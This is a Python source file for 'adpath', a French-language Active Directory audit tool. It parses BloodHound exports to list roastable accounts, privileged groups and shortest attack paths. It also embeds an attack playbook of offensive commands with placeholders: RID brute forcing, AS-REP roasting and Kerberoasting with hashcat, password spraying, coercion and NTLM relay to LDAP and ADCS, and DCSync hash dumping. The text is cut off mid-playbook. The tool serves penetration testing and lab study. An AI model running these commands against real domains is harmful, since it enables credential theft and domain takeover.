#!/usr/bin/env python3
"""
adpath — analyseur offline d'exports BloodHound → quick-wins + chemins d'attaque.

Générique : fonctionne sur n'importe quel export SharpHound / bloodhound-python
(JSON BloodHound 4.x "legacy" et format d'import CE). Pas de domaine ni de comptes
codés en dur. Lit un dossier OU un .zip.

Que fait-il :
  • liste les quick-wins d'identifiants (AS-REP, Kerberoast, mdp en description, pwd-not-required, LAPS/gMSA)
  • repère les cibles à privilèges par RID bien connus (512/519/544/548/551/526…), propriété highvalue, DCSync
  • si des comptes 'owned' sont fournis : calcule le plus court chemin vers une cible (MemberOf + abus d'ACL)
  • sinon : liste les principals non-privilégiés qui peuvent atteindre une cible (surface d'attaque)
  • exporte un rapport texte, un schéma Mermaid, et un JSON de résultats

Usage :
  adpath.py <dossier|zip> [--owned u1,u2] [--mermaid out.md] [--json out.json] [--max-hops N]

Outil d'audit / lab. À n'utiliser que sur des environnements autorisés.
"""
import json, glob, os, sys, argparse, zipfile, tempfile, subprocess, shutil, time, re
from collections import deque, defaultdict

# ── droits ACL permettant de prendre le contrôle d'une cible ──────────────────
USER_TAKEOVER  = {"GenericAll","GenericWrite","WriteDacl","WriteOwner","Owns",
                  "ForceChangePassword","AllExtendedRights","AddKeyCredentialLink"}
GROUP_TAKEOVER = USER_TAKEOVER | {"AddMember","AddSelf"}
COMP_TAKEOVER  = USER_TAKEOVER | {"AllowedToAct","ReadLAPSPassword"}
DCSYNC_RIGHTS  = {"GetChangesAll","DCSync","DS-Replication-Get-Changes-All"}
READ_SECRET    = {"ReadLAPSPassword","ReadGMSAPassword"}

# RID bien connus de groupes à hauts privilèges (indépendant de la langue/domaine)
HV_RID = {"512":"Domain Admins","516":"Domain Controllers","518":"Schema Admins",
          "519":"Enterprise Admins","520":"Group Policy Creator Owners","521":"Read-only DCs",
          "544":"Administrators","548":"Account Operators","549":"Server Operators",
          "550":"Print Operators","551":"Backup Operators","526":"Key Admins","527":"Enterprise Key Admins"}
# groupes sensibles sans RID fixe (repérés par nom, en dernier recours)
HV_NAME = {"DNSADMINS"}
DCSYNC_NODE = "::DCSYNC::"

def norm(name): return (name or "").split("@")[0]

def load_json_dir(folder):
    data = {}
    for k in ("users","groups","computers","domains","gpos","ous","containers"):
        files = glob.glob(os.path.join(folder, f"*{k}.json"))
        objs = []
        for f in files:
            try:
                j = json.load(open(f, encoding="utf-8"))
                objs += j.get("data", j if isinstance(j, list) else [])
            except Exception as e:
                print(f"[!] lecture {f}: {e}", file=sys.stderr)
        data[k] = objs
    return data

def collect(domain, user, password, dc_ip, out_dir=None, dc_host=None):
    """Wrapper OPTIONNEL : lance bloodhound-python puis renvoie le dossier des JSON.
    Le moteur d'analyse, lui, reste 100% offline."""
    if not shutil.which("bloodhound-python"):
        print("[!] bloodhound-python introuvable. Installe-le : pipx install bloodhound  (ou apt install bloodhound-python)", file=sys.stderr)
        sys.exit(2)
    out_dir = out_dir or os.path.join(tempfile.gettempdir(), f"adpath_collect_{int(time.time())}")
    os.makedirs(out_dir, exist_ok=True)
    cmd = ["bloodhound-python","-d",domain,"-u",user,"-p",password,"-ns",dc_ip,"-c","All","--zip"]
    if dc_host: cmd += ["--dns-tcp"]
    print(f"[*] Collecte BloodHound → {out_dir}\n    {' '.join(cmd[:6])} …")
    r = subprocess.run(cmd, cwd=out_dir, capture_output=True, text=True)
    sys.stderr.write(r.stdout + r.stderr)
    loose = glob.glob(os.path.join(out_dir, "*_*.json"))
    zips  = sorted(glob.glob(os.path.join(out_dir, "*.zip")))
    if not loose and not zips:
        print("\n[!] Collecte échouée. Pièges fréquents : DNS (DC injoignable), creds invalides, DC down.", file=sys.stderr)
        sys.exit(2)
    if loose:
        print(f"[+] Collecte OK ({len(loose)} fichiers JSON).")
        return out_dir
    print(f"[+] Collecte OK (archive {os.path.basename(zips[-1])}).")
    return zips[-1]   # load_input sait extraire le .zip

def load_input(path):
    if path.lower().endswith(".zip"):
        tmp = tempfile.mkdtemp(prefix="adpath_")
        with zipfile.ZipFile(path) as z: z.extractall(tmp)
        # certains zips contiennent un sous-dossier
        if not glob.glob(os.path.join(tmp,"*users.json")):
            subs = [d for d in glob.glob(os.path.join(tmp,"*")) if os.path.isdir(d)]
            if subs: tmp = subs[0]
        return load_json_dir(tmp)
    return load_json_dir(path)

class Graph:
    def __init__(self, data):
        self.data = data
        self.allobj = sum(data.values(), [])
        self.sid2name, self.sid2type, self.props = {}, {}, {}
        for k, objs in data.items():
            t = k[:-1].capitalize()
            for o in objs:
                sid = o.get("ObjectIdentifier")
                if not sid: continue
                self.sid2name[sid] = norm(o.get("Properties",{}).get("name") or sid)
                self.sid2type[sid] = t
                self.props[sid] = o.get("Properties",{})
        self.name2sid = {}
        for o in self.allobj:
            n = norm(o.get("Properties",{}).get("name")).lower()
            if n: self.name2sid[n] = o.get("ObjectIdentifier")
        self.edges = defaultdict(list)
        self._build()

    def _add(self, s, d, lbl):
        if s and d: self.edges[s].append((d, lbl))

    def _build(self):
        for g in self.data["groups"]:
            for m in g.get("Members", []):
                self._add(m["ObjectIdentifier"], g["ObjectIdentifier"], "MemberOf")
        for o in self.allobj:
            tsid = o.get("ObjectIdentifier"); ty = self.sid2type.get(tsid)
            allowed = GROUP_TAKEOVER if ty=="Group" else COMP_TAKEOVER if ty=="Computer" else USER_TAKEOVER
            for ace in o.get("Aces", []):
                r = ace.get("RightName")
                if r in allowed: self._add(ace["PrincipalSID"], tsid, r)
        for d in self.data["domains"]:
            for ace in d.get("Aces", []):
                if ace.get("RightName") in DCSYNC_RIGHTS:
                    self._add(ace["PrincipalSID"], DCSYNC_NODE, "DCSync")
        self.sid2name[DCSYNC_NODE] = "DCSync → dump NTDS (krbtgt + DA)"
        self.sid2type[DCSYNC_NODE] = "Win"

    def is_highvalue(self, sid):
        if sid == DCSYNC_NODE: return True
        rid = str(sid).rsplit("-",1)[-1]
        if self.sid2type.get(sid)=="Group" and rid in HV_RID: return True
        if self.sid2name.get(sid,"").upper() in HV_NAME: return True
        if self.props.get(sid,{}).get("highvalue") is True: return True
        return False

    def win_nodes(self):
        return {s for s in self.sid2name if self.is_highvalue(s)}

    def edge_label(self, a, b):
        for d,l in self.edges[a]:
            if d==b: return l
        return "?"

    def shortest_path(self, starts, wins):
        parent={}; q=deque()
        for s in starts: parent[s]=None; q.append(s)
        while q:
            cur=q.popleft()
            for d,_ in self.edges[cur]:
                if d not in parent:
                    parent[d]=cur
                    if d in wins:
                        p=[]; n=d
                        while n is not None: p.append(n); n=parent[n]
                        return list(reversed(p))
                    q.append(d)
        return None

    def reachers(self, wins, max_hops=4):
        """principals (non-HV) ayant un chemin <= max_hops vers une cible."""
        res={}
        for o in self.data["users"]:
            s=o["ObjectIdentifier"]
            if self.is_highvalue(s): continue
            p=self._bfs_limited(s, wins, max_hops)
            if p: res[self.sid2name.get(s,s)] = [self.sid2name.get(x,x) for x in p]
        return res

    def _bfs_limited(self, start, wins, max_hops):
        parent={start:None}; depth={start:0}; q=deque([start])
        while q:
            cur=q.popleft()
            if depth[cur]>=max_hops: continue
            for d,_ in self.edges[cur]:
                if d not in parent:
                    parent[d]=cur; depth[d]=depth[cur]+1
                    if d in wins:
                        p=[]; n=d
                        while n is not None: p.append(n); n=parent[n]
                        return list(reversed(p))
                    q.append(d)
        return None

def quick_wins(g):
    out={"asrep":[],"kerberoast":[],"desc_pwd":[],"pwdnotreqd":[],"laps":[],"gmsa":[]}
    for u in g.data["users"]:
        p=u.get("Properties",{}); n=norm(p.get("name"))
        if p.get("dontreqpreauth"): out["asrep"].append(n)
        if p.get("hasspn"): out["kerberoast"].append(n)
        if p.get("passwordnotreqd"): out["pwdnotreqd"].append(n)
        d=p.get("description") or ""
        if any(x in d.lower() for x in ("password","pass","pwd","mdp","secret")):
            out["desc_pwd"].append(f"{n}: {d}")
    for c in g.data["computers"]:
        if c.get("Properties",{}).get("haslaps"): out["laps"].append(norm(c["Properties"].get("name")))
    return out

def privileged(g):
    res={}
    for grp in g.data["groups"]:
        if g.is_highvalue(grp["ObjectIdentifier"]):
            mem=[g.sid2name.get(m["ObjectIdentifier"],m["ObjectIdentifier"]) for m in grp.get("Members",[])]
            if mem: res[g.sid2name.get(grp["ObjectIdentifier"])]=mem
    return res

def render(g, owned, path, qw, priv, reach):
    L=[]; p=L.append
    p("="*70); p(" ADPATH — analyse BloodHound"); p("="*70)
    p(f"Objets : {len(g.data['users'])} users · {len(g.data['groups'])} groups · {len(g.data['computers'])} computers")
    p(f"Owned  : {', '.join(sorted(owned)) or '(aucun)'}")
    p("\n── Quick-wins identifiants ──")
    p(f"  AS-REP roastable    : {', '.join(qw['asrep']) or '-'}")
    p(f"  Kerberoastable (SPN): {', '.join(qw['kerberoast']) or '-'}")
    p(f"  pwd-not-required    : {', '.join(qw['pwdnotreqd']) or '-'}")
    p(f"  LAPS en place       : {', '.join(qw['laps']) or '-'}")
    p("  Mots de passe en description :")
    [p(f"     {d}") for d in qw["desc_pwd"]] or p("     -")
    p("\n── Cibles à privilèges (membres) ──")
    for grp,mem in priv.items(): p(f"  {grp}: {', '.join(mem)}")
    p("\n── CHEMIN D'ATTAQUE ──")
    if path:
        for i,sid in enumerate(path):
            nm=g.sid2name.get(sid,sid); ty=g.sid2type.get(sid,"")
            if i==0: p(f"  [OWNED] {nm} ({ty})")
            else:
                lbl=g.edge_label(path[i-1],sid)
                p(f"      {'==DCSync==>' if lbl=='DCSync' else f'--{lbl}-->'}")
                p(f"  {'[OBJECTIF]' if g.is_highvalue(sid) else ''} {nm} ({ty})")
        p("\n  => Chemin exploitable trouvé.")
    else:
        p("  Pas de chemin depuis les comptes owned (ou aucun owned fourni).")
        if reach:
            p("  Surface d'attaque — comptes non-privilégiés qui MÈNENT à une cible :")
            for who,pth in sorted(reach.items(), key=lambda x:len(x[1])):
                p(f"   • {who}  =>  " + " → ".join(pth))
    return "\n".join(L)

def mermaid_body(g, owned, path, reach):
    nid=lambda s:"N"+str(abs(hash(s))%1000000)
    m=["flowchart LR"]
    if path:
        for i in range(len(path)-1):
            a,b=path[i],path[i+1]
            m.append(f'    {nid(a)}["{g.sid2name.get(a)}"] -->|{g.edge_label(a,b)}| {nid(b)}["{g.sid2name.get(b)}"]:::win')
        m += ["    classDef win fill:#fe9,stroke:#c80,stroke-width:2px;"]
    elif reach:
        m.append(f'    OWNED["OWNED: {", ".join(sorted(owned)) or "n/a"}"]:::owned')
        seen=set()
        for who,pth in sorted(reach.items(), key=lambda x:len(x[1]))[:14]:
            for i in range(len(pth)-1):
                a,b=pth[i],pth[i+1]; key=(a,b)
                if key in seen: continue
                seen.add(key)
                cls=":::win" if ("DCSync" in b or b.upper() in ("DNSADMINS","DOMAIN ADMINS","ADMINISTRATORS")) else ""
                m.append(f'    {nid(a)}["{a}"] --> {nid(b)}["{b}"]{cls}')
        m += ["    classDef owned fill:#cde,stroke:#357;","    classDef win fill:#fe9,stroke:#c80,stroke-width:2px;"]
    else:
        m.append('    X["Aucun chemin / pas de donnees owned"]')
    return "\n".join(m)

def write_mermaid(g, owned, path, reach, out):
    open(out,"w").write("```mermaid\n"+mermaid_body(g,owned,path,reach)+"\n```")

HTML_CSS = """
:root{--bg:#0e131d;--card:#161f2e;--card2:#1b2638;--fg:#e8eef6;--dim:#8ea2b8;--acc:#5aa0ff;
--win:#ffd24d;--ok:#49d389;--hi:#ff6b6b;--md:#ffb454;--lo:#7fd6ff;--bd:#27344a}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--fg);font:15px/1.55 system-ui,Segoe UI,Roboto,sans-serif}
header{padding:16px 28px;background:linear-gradient(90deg,#16417a,#0e131d);border-bottom:1px solid var(--bd)}
h1{margin:0;font-size:20px} h1 small{color:var(--dim);font-weight:400;font-size:13px}
.meta{color:var(--dim);margin-top:5px;font-size:13px}
.tabs{display:flex;gap:4px;background:#0b1019;padding:0 28px;border-bottom:1px solid var(--bd);position:sticky;top:0;z-index:5}
.tab{padding:11px 18px;cursor:pointer;color:var(--dim);border-bottom:2px solid transparent;font-weight:600;font-size:14px}
.tab.active{color:var(--acc);border-color:var(--acc)}
main{max-width:1060px;margin:0 auto;padding:18px 28px 60px}
.view{display:none} .view.active{display:block}
.verdict{border-radius:10px;padding:14px 18px;margin:14px 0;font-weight:600;border:1px solid}
.verdict.found{background:#15351f;border-color:#2f7d4d;color:#bff0cf}
.verdict.none{background:#3a2412;border-color:#8a5a22;color:#ffd9ad}
.card{background:var(--card);border:1px solid var(--bd);border-radius:10px;margin:14px 0;overflow:hidden}
.card>h2{font-size:13px;margin:0;padding:12px 16px;color:var(--acc);text-transform:uppercase;letter-spacing:.06em;
cursor:pointer;display:flex;justify-content:space-between;align-items:center;background:var(--card2);user-select:none}
.card>h2 .chev{transition:.2s} .card.collapsed .body{display:none} .card.collapsed .chev{transform:rotate(-90deg)}
.body{padding:14px 16px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:14px} @media(max-width:720px){.grid{grid-template-columns:1fr}}
ul,ol{margin:6px 0;padding-left:20px} li{margin:3px 0} .dim{color:var(--dim)}
.badge{display:inline-block;font-size:11px;font-weight:700;padding:1px 7px;border-radius:20px;margin-left:6px;vertical-align:middle}
.b-hi{background:#4a1818;color:var(--hi)} .b-md{background:#4a3312;color:var(--md)} .b-lo{background:#123246;color:var(--lo)}
.b-ok{background:#143827;color:var(--ok)} .b-hv{background:#4a3c10;color:var(--win)} .b-own{background:#1d3a66;color:var(--acc)}
table{width:100%;border-collapse:collapse;font-size:14px} td{padding:7px 8px;border-top:1px solid var(--bd);vertical-align:top}
.kv td:first-child{color:var(--dim);white-space:nowrap;width:160px} .prv td:first-child{color:var(--win);font-weight:600;white-space:nowrap}
.pathstep{display:flex;gap:10px;align-items:flex-start;margin:0 0 2px}
.pathstep .n{background:#1d3a66;border:1px solid var(--acc);border-radius:50%;width:24px;height:24px;flex:0 0 24px;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700}
.pathstep.win .n{background:#4a3c10;border-color:var(--win);color:var(--win)}
.pathstep .t{flex:1} .pathstep .edge{color:var(--md);font-size:12px} .pathstep .hint{color:var(--dim);font-size:12px}
.cred{color:var(--ok);font-family:ui-monospace,monospace}
a.plink{color:var(--acc);cursor:pointer;text-decoration:none} a.plink:hover{text-decoration:underline}
.cmd{display:flex;gap:8px;align-items:center;background:#0a0f18;border:1px solid var(--bd);border-radius:6px;padding:6px 8px;margin:5px 0;font-family:ui-monospace,monospace;font-size:13px}
.cmd code{flex:1;overflow:auto;white-space:pre;background:none;padding:0}
.cmd button{background:#223049;color:var(--fg);border:1px solid var(--bd);border-radius:5px;padding:3px 9px;cursor:pointer;font-size:12px} .cmd button:hover{background:#2c3e5c}
.mermaid{background:#070b12;border-radius:8px;padding:12px;overflow:auto;max-height:560px}
.mfallback{display:none;white-space:pre;color:var(--dim);font-family:ui-monospace,monospace;font-size:12px}
.playout{display:grid;grid-template-columns:300px 1fr;gap:14px} @media(max-width:720px){.playout{grid-template-columns:1fr}}
.plist{max-height:70vh;overflow:auto;border:1px solid var(--bd);border-radius:8px;background:var(--card)}
.plist .pitem{padding:7px 12px;cursor:pointer;border-bottom:1px solid #1d2636;font-size:14px}
.plist .pitem:hover{background:var(--card2)} .plist .pitem .ty{color:var(--dim);font-size:11px;float:right}
input.filter,input.search{width:100%;background:#0a0f18;border:1px solid var(--bd);color:var(--fg);border-radius:6px;padding:8px 10px;margin-bottom:8px}
.pdetail{min-height:200px}
.foot{color:var(--dim);text-align:center;font-size:12px;margin-top:26px}
code{background:#0b0f18;padding:1px 5px;border-radius:4px}
.ctxbar{display:flex;flex-wrap:wrap;gap:8px;background:var(--card);border:1px solid var(--bd);border-radius:8px;padding:10px 12px;margin:10px 0}
.ctxbar label{display:flex;flex-direction:column;font-size:11px;color:var(--dim);gap:3px}
.ctxbar input{background:#0a0f18;border:1px solid var(--bd);color:var(--fg);border-radius:5px;padding:5px 7px;font-size:13px;width:120px}
.ctxbar input:focus{border-color:var(--acc);outline:none}
.vlabel{color:var(--md);font-size:13px;margin:10px 0 2px;font-weight:600}
"""

HTML_JS = """
function cp(b){const t=b.previousElementSibling.innerText;navigator.clipboard.writeText(t).then(()=>{const o=b.textContent;b.textContent='copié ✓';setTimeout(()=>b.textContent=o,1200)})}
function tog(h){h.parentElement.classList.toggle('collapsed')}
function esc(s){return (s==null?'':String(s)).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
function show(v){document.querySelectorAll('.view').forEach(x=>x.classList.remove('active'));document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));document.getElementById('view-'+v).classList.add('active');document.getElementById('tab-'+v).classList.add('active');if(v==='schema')renderSchema();if(v==='killchain'&&kcCur<0)showPhase(0)}
let kcCur=-1;
function showPhase(i){kcCur=i;document.querySelectorAll('.kcphase').forEach(p=>p.style.display='none');const el=document.getElementById('phase-'+i);if(el)el.style.display='block';document.querySelectorAll('#kcnav .pitem').forEach(n=>n.style.background='');const nav=document.getElementById('kcnav-'+i);if(nav)nav.style.background='var(--card2)';applyCtx()}
const CTXKEYS=['DC','DOM','USER','PASS','NTHASH','TARGET','ATTACKER'];
function applyCtx(){const v={};CTXKEYS.forEach(k=>{const el=document.getElementById('ctx-'+k);v[k]=el?el.value.trim():''});
 document.querySelectorAll('#view-killchain code[data-tpl]').forEach(c=>{let t=c.getAttribute('data-tpl');CTXKEYS.forEach(k=>{if(v[k])t=t.split('['+k+']').join(v[k])});c.textContent=t})}
function sidOf(name){return DATA.name2sid[(name||'').toLowerCase()]}
function plink(name){const s=sidOf(name);return s?`<a class=plink onclick="goProfile('${s}')">${esc(name)}</a>`:esc(name)}
function badges(n){let b='';if(n.owned)b+='<span class="badge b-own">OWNED</span>';if(n.hv)b+='<span class="badge b-hv">HIGH VALUE</span>';(n.tags||[]).forEach(t=>b+=`<span class="badge b-hi">${esc(t)}</span>`);return b}
function buildList(q){q=(q||'').toLowerCase();const el=document.getElementById('plist');const items=Object.entries(DATA.nodes).filter(([s,n])=>n.name.toLowerCase().includes(q)).sort((a,b)=>a[1].name.localeCompare(b[1].name));el.innerHTML=items.map(([s,n])=>`<div class=pitem onclick="showProfile('${s}')"><span class=ty>${esc(n.type)}</span>${esc(n.name)}${n.hv?' ⭐':''}${n.owned?' 🔑':''}</div>`).join('')||'<div class=pitem>aucun</div>'}
function showProfile(sid){const n=DATA.nodes[sid];if(!n)return;const d=document.getElementById('pdetail');
 let props='';for(const[k,v]of Object.entries(n.props||{})){props+=`<tr><td>${esc(k)}</td><td>${esc(Array.isArray(v)?v.join(', '):v)}</td></tr>`}
 const mo=(n.memberOf||[]).map(plink).join(', ')||'<span class=dim>—</span>';
 const co=(n.controls||[]).map(c=>`${plink(c[0])} <span class=dim>(${esc(c[1])})</span>`).join('<br>')||'<span class=dim>—</span>';
 const cb=(n.controlledBy||[]).map(c=>`${plink(c[0])} <span class=dim>(${esc(c[1])})</span>`).join('<br>')||'<span class=dim>—</span>';
 d.innerHTML=`<div class=card><h2 onclick="tog(this)"><span>${esc(n.name)} <span class=dim>· ${esc(n.type)}</span> ${badges(n)}</span><span class=chev>▾</span></h2><div class=body>
 <h3 style="color:var(--acc);font-size:12px;margin:4px 0">Propriétés</h3><table class=kv>${props||'<tr><td class=dim>aucune</td></tr>'}</table>
 <div class=grid style="margin-top:10px">
 <div><h3 style="color:var(--acc);font-size:12px">Membre de</h3>${mo}</div>
 <div><h3 style="color:var(--acc);font-size:12px">Contrôlé par (qui peut le pwn)</h3>${cb}</div></div>
 <div style="margin-top:10px"><h3 style="color:var(--acc);font-size:12px">Contrôle (ce qu'il peut pwn)</h3>${co}</div>
 </div></div>`}
function goProfile(sid){show('profils');document.getElementById('psearch').value='';buildList('');showProfile(sid)}
function showFallback(){document.querySelectorAll('.mermaid').forEach(m=>m.style.display='none');document.querySelectorAll('.mfallback').forEach(f=>f.style.display='block')}
let schemaRendered=false;
function renderSchema(){
 if(schemaRendered)return; schemaRendered=true;
 if(typeof mermaid==='undefined'){showFallback();return;}   // CDN non chargé (offline)
 try{const p=mermaid.run({querySelector:'#view-schema .mermaid'});if(p&&p.catch)p.catch(()=>showFallback());
     setTimeout(()=>{if(!document.querySelector('#view-schema .mermaid svg'))showFallback();},1500);}
 catch(e){showFallback();}}
try{if(typeof mermaid!=='undefined')mermaid.initialize({startOnLoad:false,theme:'dark',securityLevel:'loose',flowchart:{useMaxWidth:false}});}catch(e){}
window.addEventListener('load',()=>{buildList('');show('resume')});
"""

ABUSE_HINT = {
 "MemberOf":"tu hérites des droits du groupe",
 "GenericAll":"contrôle total → reset mdp (users) / AddMember (groupes) / shadow creds",
 "GenericWrite":"écrire des attributs → targeted Kerberoast / shadow creds (AddKeyCredentialLink)",
 "WriteDacl":"t'accorder GenericAll puis abuser",
 "WriteOwner":"devenir propriétaire → WriteDacl → GenericAll",
 "Owns":"propriétaire → WriteDacl → GenericAll",
 "ForceChangePassword":"réinitialiser le mot de passe (net rpc / bloodyAD)",
 "AllExtendedRights":"droits étendus → ForceChangePassword / lire LAPS",
 "AddKeyCredentialLink":"shadow credentials (pywhisker/certipy) → PKINIT → NT hash",
 "AddMember":"t'ajouter au groupe (bloodyAD / net rpc group addmem)",
 "AddSelf":"t'ajouter toi-même au groupe",
 "ReadLAPSPassword":"lire le mdp administrateur local (LAPS)",
 "ReadGMSAPassword":"lire le mdp du compte gMSA",
 "AllowedToAct":"RBCD → s'impersonner sur la machine",
 "DCSync":"impacket-secretsdump -just-dc → dump de tous les hashes (krbtgt, DA)",
}

PROP_KEYS=["enabled","admincount","description","serviceprincipalnames","hasspn","dontreqpreauth",
           "passwordnotreqd","operatingsystem","pwdlastset","lastlogontimestamp","distinguishedname"]

def _node_info(g, owned, qw):
    """Construit le dict { sid: {infos} } + name2sid pour l'appli web."""
    controls=defaultdict(list); controlledBy=defaultdict(list); memberOf=defaultdict(list)
    for src,outs in g.edges.items():
        for dst,lbl in outs:
            if lbl=="MemberOf": memberOf[src].append(dst)
            else: controls[src].append((dst,lbl)); controlledBy[dst].append((src,lbl))
    tags=defaultdict(list)
    for n in qw["asrep"]: tags[n.lower()].append("AS-REP")
    for n in qw["kerberoast"]: tags[n.lower()].append("Kerberoast")
    for n in qw["pwdnotreqd"]: tags[n.lower()].append("pwd-not-req")
    for d in qw["desc_pwd"]: tags[d.split(":")[0].strip().lower()].append("desc-pwd")
    ownl={x.lower() for x in owned}
    def fmt(k,v):
        if k in ("pwdlastset","lastlogontimestamp"):
            try:
                v=int(v); return time.strftime("%Y-%m-%d", time.gmtime(v)) if v>0 else "jamais"
            except: return v
        return v
    info={}
    for s,name in g.sid2name.items():
        if s==DCSYNC_NODE: continue
        p=g.props.get(s,{})
        props={k:fmt(k,p.get(k)) for k in PROP_KEYS if p.get(k) not in (None,"",[],False) or k in ("enabled","admincount")}
        info[s]={"name":name,"type":g.sid2type.get(s,""),
                 "props":props,
                 "memberOf":[g.sid2name.get(x) for x in memberOf.get(s,[])],
                 "controls":[[g.sid2name.get(d),l] for d,l in controls.get(s,[])],
                 "controlledBy":[[g.sid2name.get(d),l] for d,l in controlledBy.get(s,[])],
                 "hv":g.is_highvalue(s),"owned":name.lower() in ownl,"tags":tags.get(name.lower(),[])}
    name2sid={norm(nm).lower():s for s,nm in g.sid2name.items() if s!=DCSYNC_NODE}
    return info, name2sid

def _graph_clickable(g, path, reach):
    """Graphe Mermaid avec 'click' vers les profils."""
    sidmap={}; nid=lambda key:sidmap.setdefault(key,"N%d"%(len(sidmap)+1))
    lines=["flowchart LR"]; clicks=[]
    safe=lambda s: re.sub(r'[^A-Za-z0-9 ._$-]',' ',str(s)).strip() or "node"
    def resolve(tok, is_sid):  # renvoie (nodeid, sid|None, label)
        if is_sid: sid=tok; label=g.sid2name.get(tok,tok)
        else: label=tok; sid=g.name2sid.get(str(tok).lower())
        i=nid(sid or ("name:"+str(tok)))
        return i,sid,safe(label)
    pairs=[]
    if path:
        for i in range(len(path)-1): pairs.append((path[i],path[i+1],g.edge_label(path[i],path[i+1]),True))
    elif reach:
        seen=set()
        for w,p in sorted(reach.items(),key=lambda x:len(x[1]))[:16]:
            for i in range(len(p)-1):
                if (p[i],p[i+1]) in seen: continue
                seen.add((p[i],p[i+1])); pairs.append((p[i],p[i+1],"",False))
    if not pairs: lines.append('X["pas de donnees owned — vue par profils dispo"]')
    for a,b,lbl,iss in pairs:
        ia,sa,la=resolve(a,iss); ib,sb,lb=resolve(b,iss)
        arrow=f'-->|{lbl}|' if lbl else '-->'
        win=':::win' if (g.is_highvalue(sb) if sb else ("DCSYNC" in str(b).upper() or "ADMIN" in str(b).upper())) else ''
        lines.append(f'    {ia}["{la}"] {arrow} {ib}["{lb}"]{win}')
    lines.append("    classDef win fill:#4a3c10,stroke:#c80,color:#ffd24d;")
    for key,i in sidmap.items():
        if isinstance(key,str) and key.startswith("S-"):
            clicks.append(f'    click {i} call goProfile("{key}")')
    return "\n".join(lines+clicks)

def build_killchain():
    """Méthodo d'attaque AD générique, par phase, avec variantes SELON LA SITUATION.
    Les commandes utilisent des tokens [DC] [DOM] [USER] [PASS] [NTHASH] [ATTACKER] [TARGET]…
    remplis en direct depuis les champs de contexte dans la page HTML."""
    return [
     {"t":"1. Recon réseau & services","m":"T1046 / T1595",
      "why":"Point de départ : à partir de l'IP cible, identifier le DC et les services (SMB, LDAP, Kerberos, WinRM, ADCS). Renseigne [DC] dans le contexte en haut.","tools":"nmap, netexec, ldapsearch, enum4linux-ng",
      "v":[{"c":"Scan","cmds":["nmap -Pn -p 88,135,139,389,445,464,636,3268,5985,9389 -sV [DC]","nxc smb [DC]"]},
           {"c":"Infos domaine (anonyme)","cmds":["enum4linux-ng -A [DC]","ldapsearch -x -H ldap://[DC] -s base namingcontexts"]}]},
     {"t":"2. Énumération utilisateurs (sans creds)","m":"T1087.002 / T1589",
      "why":"Lister les comptes. Si RestrictAnonymous bloque → assume-breach (liste via un 1er compte).","tools":"netexec, kerbrute, impacket-lookupsid",
      "v":[{"c":"Session nulle / guest","cmds":["nxc smb [DC] -u '' -p '' --users","nxc smb [DC] -u 'guest' -p '' --rid-brute 10000","impacket-lookupsid [DOM]/guest@[DC] -no-pass 10000"]},
           {"c":"Par Kerberos (sans session)","cmds":["kerbrute userenum -d [DOM] --dc [DC] users.txt"]}]},
     {"t":"3. AS-REP Roasting","m":"T1558.004",
      "why":"Comptes sans pré-auth Kerberos : hash crackable SANS mot de passe.","tools":"impacket, Rubeus, netexec, hashcat/john",
      "v":[{"c":"Sans compte (Linux)","cmds":["impacket-GetNPUsers [DOM]/ -usersfile users.txt -no-pass -dc-ip [DC] -format hashcat -outputfile asrep.hash","hashcat -m 18200 asrep.hash rockyou.txt"]},
           {"c":"Avec un compte (nxc)","cmds":["nxc ldap [DC] -u [USER] -p [PASS] --asreproast asrep.hash"]},
           {"c":"Depuis Windows","cmds":["Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash"]}]},
     {"t":"4. Password Spraying","m":"T1110.003",
      "why":"Tester 1 mot de passe sur tous les comptes. ⚠ lire la lockout policy AVANT.","tools":"netexec, kerbrute",
      "v":[{"c":"Vérifier le lockout d'abord","cmds":["nxc smb [DC] -u [USER] -p [PASS] --pass-pol"]},
           {"c":"Spray","cmds":["nxc smb [DC] -u users.txt -p '[PASS]' --continue-on-success","kerbrute passwordspray -d [DOM] --dc [DC] users.txt '[PASS]'"]}]},
     {"t":"5. Énumération authentifiée + BloodHound","m":"T1087 / T1069",
      "why":"Avec un 1er compte : cartographier users, groupes, ACL, chemins.","tools":"netexec, bloodhound-python, SharpHound, adpath",
      "v":[{"c":"Collecte (Linux)","cmds":["nxc smb [DC] -u [USER] -p [PASS] --users --groups --shares","bloodhound-python -u [USER] -p [PASS] -d [DOM] -ns [DC] -c All --zip"]},
           {"c":"Collecte (Windows)","cmds":["SharpHound.exe -c All"]},
           {"c":"Analyse rapide","cmds":["python3 adpath.py <zip> --owned [USER] --html report.html --open"]}]},
     {"t":"6. Coercion + NTLM relay","m":"T1187 / T1557.001",
      "why":"Sans creds mais accès réseau : forcer une machine à s'authentifier, puis relayer (LDAP/SMB/ADCS). Renseigne [ATTACKER].","tools":"ntlmrelayx, Coercer, PetitPotam, Responder",
      "v":[{"c":"Relais vers LDAP (RBCD)","cmds":["impacket-ntlmrelayx -t ldap://[DC] --delegate-access --no-dump","python3 Coercer.py coerce -l [ATTACKER] -t [DC] -u [USER] -p [PASS]"]},
           {"c":"Relais vers ADCS (ESC8)","cmds":["impacket-ntlmrelayx -t http://[TARGET]/certsrv/certfnsh.asp --adcs --template DomainController"]}]},
     {"t":"7. Kerberoasting","m":"T1558.003",
      "why":"Comptes de service (SPN) : TGS crackable offline.","tools":"impacket, Rubeus, netexec, targetedKerberoast",
      "v":[{"c":"Depuis Linux","cmds":["impacket-GetUserSPNs [DOM]/[USER]:[PASS] -dc-ip [DC] -request -outputfile kerb.hash","hashcat -m 13100 kerb.hash rockyou.txt"]},
           {"c":"Via nxc / Windows","cmds":["nxc ldap [DC] -u [USER] -p [PASS] --kerberoasting kerb.hash","Rubeus.exe kerberoast /outfile:kerb.hash"]},
           {"c":"Targeted (GenericWrite sur un compte)","cmds":["python3 targetedKerberoast.py -d [DOM] -u [USER] -p [PASS]"]}]},
     {"t":"8. Abus d'ACL / ACE","m":"T1222 / T1098",
      "why":"GenericAll/WriteDacl/WriteOwner/ForceChangePassword → prise de contrôle. Suivre le chemin adpath/BloodHound. [TARGET] = objet contrôlé.","tools":"bloodyAD, impacket (dacledit/owneredit), PowerView, net rpc",
